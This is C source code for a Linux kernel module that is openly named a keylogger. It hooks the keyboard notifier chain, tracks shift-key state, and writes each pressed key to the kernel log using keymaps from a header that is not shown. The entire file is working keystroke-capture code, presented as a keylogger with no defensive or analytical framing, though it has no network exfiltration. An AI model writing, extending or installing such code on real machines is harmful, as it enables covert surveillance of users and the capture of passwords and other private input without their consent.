#include<linux/module.h>
#include<linux/keyboard.h>
#include<linux/kernel.h>
#include<linux/init.h>
#include<linux/semaphore.h>
#include "keyLoggerMap.h"

MODULE_LICENSE("GPL");

static struct notifier_block my_notifier;
struct semaphore sem;
static int shiftKeyPressed=0;

int my_keylogger_notifier(struct notifier_block *,unsigned long,void *);

int my_keylogger_notifier(struct notifier_block *nb,unsigned long code,void *_param){
    struct keyboard_notifier_param *param=_param;

    if(code==KBD_KEYCODE){
        //This part of code tracks if shift key is up or down,based on this value the returned value changes doesnt it
        //42 is left shift key and 54 is right shift key0
        if(param->value==42 || param->value==54){
            
            if(param->down){
                shiftKeyPressed=1;
            }else{
                shiftKeyPressed=0;
            }
        
            return NOTIFY_OK;
        }
        //param->down == key being pressed,if it is 1 key down/pressed while 0 means key up or realased
        if(param->down){
            
            if(shiftKeyPressed==0){
                printk(KERN_INFO "%s\n",keymap[param->value]); //param->value is the key number pressed
                
            }else{
                printk(KERN_INFO "%s\n",keymapShiftActivated[param->value]);
            }
            
        }


    }
    return NOTIFY_OK;
}


static int __init keyLogger_init(void){
    my_notifier.notifier_call=my_keylogger_notifier; //Here give the function which my be called
    register_keyboard_notifier(&my_notifier);
    printk(KERN_INFO "Have successfully register my keylogger program....\n");
    return 0;
}

static void __exit keyLogger_exit(void){
    unregister_keyboard_notifier(&my_notifier);
    printk(KERN_INFO "Have unregistered my keylogger program........\n");
    return;
}

module_init(keyLogger_init);
module_exit(keyLogger_exit);
